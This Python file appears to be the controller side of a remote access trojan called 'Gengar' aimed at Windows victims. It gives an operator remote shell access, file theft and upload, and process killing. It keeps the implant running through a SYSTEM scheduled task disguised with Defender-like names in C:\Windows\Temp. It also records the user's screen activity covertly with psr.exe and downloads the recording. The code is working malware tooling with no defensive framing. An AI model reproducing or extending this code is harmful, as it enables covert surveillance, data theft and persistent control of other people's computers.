import datetime
import os
import socket
import struct
import time
from dataclasses import dataclass
from logging import log
from typing import Union

import auth_keys
import output
from auth_keys import AuthenticationKeys
from logger import logger

from hashlib import md5


class CommandTypes:
    ECHO = 0
    SHELL = 1
    MSGBOX = 2
    SUICIDE = 3
    DOWNLOAD_FILE = 4
    UPLOAD_FILE = 5
    GET_PATH = 6


INT_SIZE = 4
LONG_SIZE = 8


class GengarAuthenticationFailed(Exception):
    def __str__(self) -> str:
        return 'Failed to authenticate Gengar with the CNC.'


class GengarDisconnected(Exception):
    def __str__(self) -> str:
        return 'Gengar has disconnected from the CNC.'


class GengarError(Exception):
    def __init__(self, msg: str):
        self.message = msg


@dataclass
class ShellOutput:
    exit_code: int
    output: Union[str, bytes]


@dataclass
class Gengar:
    _sock: socket.socket
    host: str
    _authenticated: bool = False
    alive: bool = True

    _AUTH_KEYS = auth_keys.get()
    _AUTH_TIMEOUT_SEC = 5

    _FILE_IO_CHUNK_SIZE = 8192

    _PSR_OUTPUT_PATH = r'C:\Windows\Temp\MpDebug41.zip'

    _GENGAR_PATH = r'C:\Windows\Temp\MpCmdStub.log'
    _SCHTASKS_TASK_NAME = 'MpCmdStub'
    _SCHTASKS_CREATE_CMD = f'schtasks /create /f /sc ONSTART /ru SYSTEM /tn "{_SCHTASKS_TASK_NAME}" /tr "cmd /c {_GENGAR_PATH}"'
    _SCHTASKS_QUERY_CMD = f'schtasks /query /tn "{_SCHTASKS_TASK_NAME}"'
    _SCHTASKS_DELETE_CMD = f'schtasks /delete /f /tn "{_SCHTASKS_TASK_NAME}"'

    def init(self) -> None:
        self.spawn_time = datetime.datetime.now()
        self.username = self.shell('echo %username%').output
        self.host, self.port = self._sock.getpeername()
        self.persist()
        logger.info(f'Gengar initialized: {self.username}')


    def _send(self, buf: bytes) -> None:
        if not self.alive:
            raise GengarDisconnected

        try:
            self._sock.sendall(buf)
        except ConnectionError:
            self.alive = False
            raise GengarDisconnected from None

    def _recv(self, bufsize: int) -> bytes:
        if not self.alive:
            raise GengarDisconnected

        try:
            return self._sock.recv(bufsize)
        except ConnectionError:
            self.alive = False
            raise GengarDisconnected from None

    def _recvall(self, bufsize: int) -> bytes:
        data = b''
        bytes_remaining = bufsize
        while bytes_remaining:
            data_chunk = self._recv(bytes_remaining)
            data += data_chunk
            bytes_remaining -= len(data_chunk)
        return data

    def echo(self, text: str) -> str:
        self._send(struct.pack('I', CommandTypes.ECHO) + struct.pack('I', len(text)) + text.encode())
        output = self._recvall(len(text)).decode()
        return output

    def is_persistent(self) -> bool:
        return self.shell(self._SCHTASKS_QUERY_CMD).exit_code == 0

    def persist(self):
        if self.is_persistent():
            return

        self.move_file(self._get_path(), self._GENGAR_PATH)
        create_task_cmd_output = self.shell(self._SCHTASKS_CREATE_CMD)
        if create_task_cmd_output.exit_code != 0:
            raise GengarError(f'Failed to create scheduled task: {create_task_cmd_output.output}')

    def unpersist(self):
        if not self.is_persistent():
            return

        self.delete_file(self._GENGAR_PATH)
        delete_task_cmd_output = self.shell(self._SCHTASKS_DELETE_CMD)
        if delete_task_cmd_output.exit_code != 0:
            raise GengarError(f'Failed to delete scheduled task: {delete_task_cmd_output.output}')

    def shell(self, cmd: str) -> ShellOutput:
        output = b''
        self._send(struct.pack('I', CommandTypes.SHELL) + struct.pack('I', len(cmd)) + cmd.encode())
        while True:
            output_size = struct.unpack('I', self._recvall(INT_SIZE))[0]
            if not output_size:
                exit_code = struct.unpack('i', self._recvall(INT_SIZE))[0]
                break
            output += self._recvall(output_size)

        try:
            return ShellOutput(exit_code, output.decode().strip())
        except UnicodeDecodeError:
            return ShellOutput(exit_code, output)

    def msgbox(self, title: str, text: str) -> None:
        self._send(struct.pack('I', CommandTypes.MSGBOX) + struct.pack('I', len(title)) +
                   title.encode() + struct.pack('I', len(text)) + text.encode())

    def download_file(self, remote_path: str, local_path: str = None) -> None:
        local_path = local_path or output.generate_path(remote_path)

        self._send(struct.pack('I', CommandTypes.DOWNLOAD_FILE) +
                   struct.pack('I', len(remote_path)) + remote_path.encode())
        return_code = struct.unpack('I', self._recvall(INT_SIZE))[0]
        if return_code != 0:
            raise GengarError(f'Failed to download file: {return_code}')

        bytes_remaining = struct.unpack('Q', self._recvall(LONG_SIZE))[0]
        logger.info(f'Downloading {remote_path} ({bytes_remaining})')
        with open(local_path, 'wb') as output_file:
            while True:
                if not bytes_remaining:
                    break
                bytes_to_read = min(bytes_remaining, self._FILE_IO_CHUNK_SIZE)
                file_chunk = self._recvall(bytes_to_read)
                output_file.write(file_chunk)
                bytes_remaining -= bytes_to_read

    def upload_file(self, local_path: str, remote_path: str = None) -> None:
        self._send(struct.pack('I', CommandTypes.UPLOAD_FILE) +
                   struct.pack('I', len(remote_path)) + remote_path.encode())
        return_code = struct.unpack('I', self._recvall(INT_SIZE))[0]
        if return_code != 0:
            raise GengarError(f'Failed to download file: {return_code}')

        file_size = os.path.getsize(local_path)
        self._send(struct.pack('Q', file_size))
        logger.info(f'Uploading {local_path} ({file_size})')
        with open(local_path, 'rb') as output_file:
            while True:
                file_chunk = output_file.read(self._FILE_IO_CHUNK_SIZE)
                if not file_chunk:
                    break
                self._send(file_chunk)

    def delete_file(self, remote_path: str) -> None:
        output = self.shell(f'del {remote_path}')
        if output.exit_code != 0:
            raise GengarError(f'Failed to delete file: {output.output}')

    def move_file(self, src_remote_path: str, dst_remote_path: str) -> None:
        output = self.shell(f'move {src_remote_path} {dst_remote_path}')
        if output.exit_code != 0:
            raise GengarError(f'Failed to move file: {output.output}')

    def file_exists(self, remote_path: str) -> bool:
        return self.shell(f'if exist {remote_path} (exit 0) else (exit 1)').exit_code == 0

    def record_activity(self, duration: int) -> None:
        self.shell(f'psr /start /sc 1 /gui 0 /output {self._PSR_OUTPUT_PATH}')
        logger.info(f'Waiting for {duration} seconds.')
        time.sleep(duration)

        self.shell('psr /stop')
        logger.info('Stopped recording.')
        time.sleep(5)  # Give the system some time to write the file.

        if self.file_exists(self._PSR_OUTPUT_PATH):
            self.download_file(self._PSR_OUTPUT_PATH)
            self.delete_file(self._PSR_OUTPUT_PATH)
        else:
            logger.info('User is inactive.')
            self.kill_process('psr.exe')

    def kill_process(self, process_name: str) -> None:
        output = self.shell(f'taskkill /F /IM {process_name}')
        if output.exit_code != 0:
            GengarError(f'Failed to kill process: {output.output}')

    def suicide(self) -> None:
        self.unpersist()
        self._send(struct.pack('I', CommandTypes.SUICIDE))
        self._sock.close()
        self.alive = False

    def lock_workstation(self) -> None:
        self.shell('rundll32.exe user32.dll,LockWorkStation')

    def process_list(self) -> str:
        return self.shell('tasklist').output

    def auth(self):
        if self._authenticated:
            logger.info('Gengar already authenticated.')
            return

        try:
            self._sock.settimeout(self._AUTH_TIMEOUT_SEC)
            received_gengar_key = self._recvall(AuthenticationKeys.KEY_LEN)
            if received_gengar_key != self._AUTH_KEYS.gengar:
                raise GengarAuthenticationFailed
            self._send(self._AUTH_KEYS.cnc)
            self._authenticated = True
        except socket.timeout:
            raise GengarAuthenticationFailed
        finally:
            self._sock.settimeout(None)

    def _get_path(self) -> str:
        self._send(struct.pack('I', CommandTypes.GET_PATH))
        gengar_path_len = struct.unpack('I', self._recvall(INT_SIZE))[0]
        return self._recvall(gengar_path_len).decode()

    @property
    def uptime(self):
        return datetime.datetime.now() - self.spawn_time

    def __repr__(self) -> str:
        return f'Gengar @ {self.username} # {self.uptime}'

    def __hash__(self) -> str:
        unique_parameters = (self.spawn_time, self.username, self.host)
        return md5(bytes('-'.join(unique_parameters), 'utf-8')).hexdigest()
